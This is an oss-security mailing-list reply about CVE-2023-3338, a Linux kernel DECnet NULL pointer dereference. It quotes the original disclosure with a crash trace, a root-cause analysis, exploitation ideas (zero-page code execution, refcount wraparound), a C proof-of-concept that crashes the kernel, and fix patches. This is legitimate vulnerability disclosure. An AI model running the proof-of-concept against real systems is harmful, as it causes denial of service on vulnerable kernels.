Received: (qmail 31784 invoked by uid 550); 24 Jun 2023 16:48:04 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 24062 invoked from network); 24 Jun 2023 16:38:54 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20221208; t=1687624722; x=1690216722;
        h=content-transfer-encoding:to:subject:message-id:date:from
         :in-reply-to:references:mime-version:from:to:cc:subject:date
         :message-id:reply-to;
        bh=jw8DJo3PGMc5QE6VoIpzC54FxpeKSVL6ql4UTs13+AQ=;
        b=erpwlXviFmRESo9DMU5y2P3K4Vx6KxuwBXY6WoQV1QhlPfS5yA8dBiP9SqTDMWsieK
         pTKdl9KSNODM6FxdAvRKLas7TZc7XL4OiOTa31W+DeKwTFudbA21Tsxmb8A+cxqRIuWN
         F5VjUZo6P97btQ1ESUVDCe+qA6CinJjLCmYuyeUNYhXMEOVwfdUJyDlhBMIb/gE6fWPW
         ph11EF94t9scYcJelro/hDLt3gxrBpjG6WKQ8sB8LsxCbx6qtQTW1+nRVNJEMT98sek2
         4oJLdn/ceUDfYYDGQVPnXWzjGFhTAiPOE2Jp234sc1u6IY+htTbLa9/4T6R65b9uBBSw
         YUCw==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20221208; t=1687624722; x=1690216722;
        h=content-transfer-encoding:to:subject:message-id:date:from
         :in-reply-to:references:mime-version:x-gm-message-state:from:to:cc
         :subject:date:message-id:reply-to;
        bh=jw8DJo3PGMc5QE6VoIpzC54FxpeKSVL6ql4UTs13+AQ=;
        b=RNTi67izz/cedjKn+YA3HLfoEPX938dIACZB4VXomQAZBYSP23YopVfBdeGBeLJ/Ii
         kOu7um/5PibR3W527qlanl/aDaVaX/h0lJXaPifoT7/G+g1V8TXjc6u/fQpBlYiqqXVR
         Tfx+79mv3+80irFxpZMXd2FiH8LMxIfWfDwq0TxkEObZFrZgFKARTl7cXp7+rNZzCG5f
         56+adyDyxRenhCopA3KK1g34LY3o/YpvWM2xivJRDKf7HufLaELgz4K7pMUJksBz27vC
         Z4xzymsyQKxUL9uobioL74PK3Prv/7XSrax92TsnwAPJlhjowWiNyUWAG0sYF5+JkUxn
         KgFQ==
X-Gm-Message-State: AC+VfDxKTJsdBoK3lJB/YzomtKkQCXLzaL53AgTkn7tcBMxHFcVatISE
	SfBJBG9YxQtJaz1LdDhtRcog1j0Ywvl1f+88/TdvD+5IbNI=
X-Google-Smtp-Source: ACHHUZ5vh3U9SYdQ5y2758gaKAM4sH/f8rTHl7k6jiPGXftrLpprjxtSlP+Bj+mjuGeUy8yPClYwKAGP7YCHMAuoxaQ=
X-Received: by 2002:a17:90b:2246:b0:24e:1575:149 with SMTP id
 hk6-20020a17090b224600b0024e15750149mr17118807pjb.48.1687624721345; Sat, 24
 Jun 2023 09:38:41 -0700 (PDT)
MIME-Version: 1.0
References: <92b180310a434c8bbca9b2449180d85d@betrusted.it>
In-Reply-To: <92b180310a434c8bbca9b2449180d85d@betrusted.it>
From: Peter Philip Pettersson <philip.pettersson@gmail.com>
Date: Sat, 24 Jun 2023 09:38:31 -0700
Message-ID: <CAHQ_-nRL416aT6WwhVu6gamTMWaTs25Nv3AUcOxzKCySQT0yCQ@mail.gmail.com>
To: oss-security@lists.openwall.com
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: quoted-printable
Subject: Re: [oss-security] CVE-2023-3338: Linux Kernel NULL Pointer
 Dereference in DECnet

On Sat, Jun 24, 2023 at 9:26=E2=80=AFAM Ornaghi Davide - Betrusted
<davide.ornaghi@betrusted.it> wrote:
>
> Hi all,
>
>
>
> I'm reporting a Null Pointer Dereference vulnerability that I found while=
 attempting to ping localhost by sending a Hello message to a local DECnet =
socket:
>
>
>
> ```
> [45620.986136] BUG: kernel NULL pointer dereference, address: 00000000000=
00000
> [45620.986141] #PF: supervisor read access in kernel mode
> [45620.986143] #PF: error_code(0x0000) - not-present page
> [45620.986146] PGD 0 P4D 0
> [45620.986148] Oops: 0000 [#1] PREEMPT SMP NOPTI
> [45620.986152] CPU: 6 PID: 37997 Comm: test Tainted: G        W    L    5=
.19.0-43-generic #44~22.04.1-Ubuntu
> [45620.986155] Hardware name: VMware, Inc. VMware Virtual Platform/440BX =
Desktop Reference Platform, BIOS 6.00 11/12/2020
> [45620.986156] RIP: 0010:dn_nsp_send+0x1c9/0x200 [decnet]
> [45620.986159] Code: 74 3e 8d 48 01 f0 0f b1 4a 40 41 0f 94 c6 45 84 f6 7=
4 eb 48 89 d3 49 89 d7 48 83 e3 fe 48 89 55 90 e8 eb f7 ac c0 48 8b 55 90 <=
48> 8b 02 48 8b 80 e8 00 00 00 49 89 85 e8 01 00 00 e9 93 fe ff ff
> [45620.986161] RSP: 0018:ffffc90032abfc90 EFLAGS: 00010246
> [45620.986164] RAX: 0000000000000000 RBX: 0000000000000000 RCX: 000000000=
0000000
> [45620.986165] RDX: 0000000000000000 RSI: 0000000000000000 RDI: 000000000=
0000000
> [45620.986166] RBP: ffffc90032abfd00 R08: 0000000000000000 R09: 000000000=
0000000
> [45620.986167] R10: 0000000000000000 R11: 0000000000000000 R12: ffff8881a=
ca6f9c0
> [45620.986168] R13: ffff888118903cc0 R14: 0000000000000000 R15: 000000000=
0000000
> [45620.986172] FS:  00007f144e58b740(0000) GS:ffff888339d80000(0000) knlG=
S:0000000000000000
> [45620.986173] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
> [45620.986175] CR2: 0000000000000000 CR3: 0000000226154004 CR4: 000000000=
0770ee0
> [45620.986185] PKRU: 55555554
> [45620.986186] Call Trace:
> [45620.986189]  <TASK>
> [45620.986191]  dn_nsp_send_conninit+0x207/0x4c0 [decnet]
> [45620.986196]  __dn_connect+0x172/0x230 [decnet]
> [45620.986220]  dn_connect+0x5c/0xa0 [decnet]
> [45620.986223]  __sys_connect_file+0x68/0x80
> [45620.986225]  __sys_connect+0xb6/0xe0
> [45620.986227]  ? exit_to_user_mode_loop+0xf1/0x140
> [45620.986228]  ? exit_to_user_mode_prepare+0x3b/0xd0
> [45620.986230]  ? syscall_exit_to_user_mode+0x2a/0x50
> [45620.986232]  ? do_syscall_64+0x69/0x90
> [45620.986234]  __x64_sys_connect+0x18/0x30
> [45620.986236]  do_syscall_64+0x59/0x90
> [45620.986237]  ? exit_to_user_mode_prepare+0x3b/0xd0
> [45620.986241]  ? syscall_exit_to_user_mode+0x2a/0x50
> [45620.986242]  ? do_syscall_64+0x69/0x90
> [45620.986244]  entry_SYSCALL_64_after_hwframe+0x63/0xcd
> ```
>
> ## Bug details
>
> This crash is due to the dn_nsp_send function (net/decnet/dn_nsp_out.c) w=
hich, first off, causes a Denial of Service by preventing the release of lo=
cks such as the current sock's sk->sk_lock, but could also lead to Local Pr=
ivilege Escalation under certain conditions.
>
> When first starting a connection with a DECnet socket, the connect() hand=
ler __dn_connect, while building a route, ends up calling dst_alloc (net/de=
cnet/dn_route.c:1178) which initializes the dst reference counter to 0 inst=
ead of 1 (see commit 76371d2e3ad1f84426a30ebcd8c3b9b98f4c724f for an explan=
ation).
> Later on, dn_insert_route is expected to increase the dst refcount, but i=
n reality, it fails to do so, since dst_hold_and_use (net/decnet/dn_route.c=
:347) actually calls atomic_inc_not_zero on dst->__refcnt, which only works=
 if the refcount is not 0. While the refcount hasn't changed, the dst->_use=
 counter is correctly incremented by dst_use_noref.
>
> ```c
> static inline void dst_hold(struct dst_entry *dst)
> {
>     BUILD_BUG_ON(offsetof(struct dst_entry, __refcnt) & 63);
>     WARN_ON(atomic_inc_not_zero(&dst->__refcnt) =3D=3D 0);            <=
=3D=3D=3D
> }
> ```
>
> Therefore, a warning gets thrown.
> As a consequence, all the following sk_dst_get(sk) calls will return NULL=
 since this function also uses atomic_inc_not_zero, and returns NULL on fai=
lure.
> This condition leads to a NPD at net/decnet/dn_nsp_out.c:92:
>
> ```c
> if (dn_route_output_sock(&sk->sk_dst_cache, &fld, sk, 0) =3D=3D 0) {
>     dst =3D sk_dst_get(sk);
>     sk->sk_route_caps =3D dst->dev->features;                        <=3D=
=3D=3D   dst is NULL
>     goto try_again;
> }
> ```
>
> ## Exploitation scenarios
>
> Furthermore, the try_again label redirects the execution to the following=
 code:
>
> ```c
> if (dst) {
>     try_again:
>     skb_dst_set(skb, dst);
>     dst_output(&init_net, skb->sk, skb);        <=3D=3D=3D
>     return;
> }
> ```
>
> where the dst->output() function is invoked by dst_output to send the out=
going packet after the routing decision. In an attacker's ideal conditions,=
 where the zero page is mappable, this allows arbitrary code execution.
>
> In more modern systems, the previous scenario can be triggered multiple t=
imes to possibly control other reference counters and thus trigger further =
vulnerabilities such as UAF.
> For instance, one could force the sock->file (from __sys_sendto) refcount=
 to wrap around and eventually free it, though a definitive exploitation te=
chnique is still under study.
>
> ## Vulnerable versions
>
> Linux kernels with DECnet support from Linux-4.12-rc7 (commit 76371d2e3ad=
1f84426a30ebcd8c3b9b98f4c724f) up to Linux-6.0.19.
> The said subsystem has been removed during the 6.1 merge window because d=
eprecated.
>
> ## Proof-of-Concept
>
> The kernel has to be compiled with CONFIG_DECNET=3Dy and should have a DE=
Cnet address assigned (echo -n "1.10" > /proc/sys/net/decnet/node_address):
>
> ```c
> int main() {
>     int sockfd;
>
>     if ((sockfd =3D socket(AF_DECnet, SOCK_SEQPACKET, DNPROTO_NSP)) =3D=
=3D -1) {
>         perror("socket");
>         exit(-1);
>     }
>     struct sockaddr_dn sockaddr;
>     struct nodeent dp;
>     static struct dn_naddr addr;
>     char *nodename =3D "turtle";
>     addr.a_addr[0] =3D 10 & 0xFF;
>     addr.a_addr[1] =3D (1 << 2) | ((10 & 0x300) >> 8);
>     sockaddr.sdn_family =3D AF_DECnet;
>     sockaddr.sdn_flags  =3D 0x00;
>     sockaddr.sdn_objnum  =3D DNOBJECT_MIRROR;
>     sockaddr.sdn_objnamel  =3D 0x00;
>
>     dp.n_addr =3D (unsigned char *)&addr.a_addr;
>     dp.n_length =3D 2;
>     dp.n_name =3D nodename;
>     dp.n_addrtype =3D AF_DECnet;
>
>     if (connect(sockfd, (struct sockaddr *)&sockaddr, sizeof(sockaddr)) <=
 0) {
>         perror("socket");
>         exit(-1);
>     }
>     return 0;
> }
> ```
>
> Writing a PoC that returns a root shell on devices without SMAP and vm.mm=
ap_min_addr is also trivial.

Agreed, but you won't find modern systems without these protections
enabled by default. Blocking mmap() from mapping the zero page has
been a thing since Linux 2.6.24. SMAP, while more recent, is also
something modern kernel exploits must bypass in order to have
realistic impact.

>
> ## Bug fix
>
> This was my suggested patch:
>
> ```diff
> --- a/net/decnet/dn_route.c     2023-06-06 15:55:36.615147110 +0200
> +++ b/net/decnet/dn_route.c     2023-06-06 15:56:00.179416949 +0200
> @@ -1175,7 +1175,7 @@ make_route:
>         if (dev_out->flags & IFF_LOOPBACK)
>                 flags |=3D RTCF_LOCAL;
>
> -       rt =3D dst_alloc(&dn_dst_ops, dev_out, 0, DST_OBSOLETE_NONE, 0);
> +       rt =3D dst_alloc(&dn_dst_ops, dev_out, 1, DST_OBSOLETE_NONE, 0);
>         if (rt =3D=3D NULL)
>                 goto e_nobufs;
> ```
>
> Also, always make sure that dst isn't NULL after sk_dst_get:
>
> ```diff
> --- a/net/decnet/dn_nsp_out.c   2023-06-06 22:01:57.212802584 +0200
> +++ b/net/decnet/dn_nsp_out.c   2023-06-06 22:04:37.138709847 +0200
> @@ -89,7 +89,9 @@ try_again:
>         fld.flowidn_proto =3D DNPROTO_NSP;
>         if (dn_route_output_sock(&sk->sk_dst_cache, &fld, sk, 0) =3D=3D 0=
) {
>                 dst =3D sk_dst_get(sk);
> -               sk->sk_route_caps =3D dst->dev->features;
> +               if (!dst)
> +                       return;
> +               sk->sk_route_caps =3D dst->dev->features;
>                 goto try_again;
>         }
> ```
>
> The DECnet subsystem has been officially removed from all longterm and st=
able kernel series, starting from 4.14.319, 4.19.287, 5.4.248, 5.10.185 and=
 5.15.118.
>
> Best regards,
>
> Davide Ornaghi
